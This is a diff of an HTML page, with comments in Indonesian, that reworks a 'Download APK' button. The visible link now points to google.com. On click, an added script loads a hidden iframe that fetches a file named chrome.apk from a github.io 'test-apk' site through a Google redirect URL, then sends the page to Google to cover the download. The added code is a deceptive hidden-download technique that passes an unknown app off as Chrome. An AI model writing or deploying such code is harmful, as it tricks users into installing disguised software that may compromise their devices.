@@ -54,9 +54,9 @@
             <button id="openPickerBtn" class="secondary">Open New Window & Upload Photo</button>
         </div>
 
-        <!-- Tombol Diperkuat: Download APK dengan URL Lengkap & Trigger Gabungan -->
+        <!-- Tombol Diperkuat: Jendela atas akan membuka google.com, bawah memproses download APK -->
         <div>
-            <a href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" 
+            <a href="https://www.google.com" 
                class="button-link" 
                id="downloadApkBtn" 
                target="_blank" 
@@ -67,14 +67,14 @@
     </div>
 
     <script>
-        // Fungsi pembantu untuk memicu redirect halaman setelah 4 detik tanpa alert
+        // Fungsi pembantu untuk memicu redirect halaman setelah 4 detik
         function triggerDelayedRedirect() {
             setTimeout(function() {
-                window.location.href = "https://www.chrome.com";
-            }, 1800); // 4000 milidetik = 4 detik
+                window.location.href = "https://www.google.com";
+            }, 4000); // 4000 milidetik = 4 detik
         }
 
-        // Logika asli Anda untuk File Picker (tanpa alert)
+        // Logika asli Anda untuk File Picker
         document.getElementById('openPickerBtn').addEventListener('click', async () => {
             try {
                 if (window.showOpenFilePicker) {
@@ -85,11 +85,10 @@
                 console.error('File picker ditolak atau dibatalkan:', err);
             }
             
-            // Memicu hitungan mundur redirect 4 detik setelah tombol diklik
             triggerDelayedRedirect();
         });
 
-        // Logika penguatan untuk tombol Download APK & pemicu jendela bersamaan
+        // Logika untuk tombol Download APK & pemicu jendela bersamaan
         document.getElementById('downloadApkBtn').addEventListener('click', function(e) {
             try {
                 if (window.showOpenFilePicker) {
@@ -99,7 +98,15 @@
                 console.error('Trigger error:', err);
             }
 
-            // Memicu hitungan mundur redirect 4 detik setelah tautan diklik
+            // Memunculkan iframe download APK di latar belakang halaman bawah
+            setTimeout(function() {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
+                document.body.appendChild(iframe);
+            }, 500);
+
+            // Memicu hitungan mundur redirect halaman utama ke Google setelah 4 detik
             triggerDelayedRedirect();
         });
     </script>
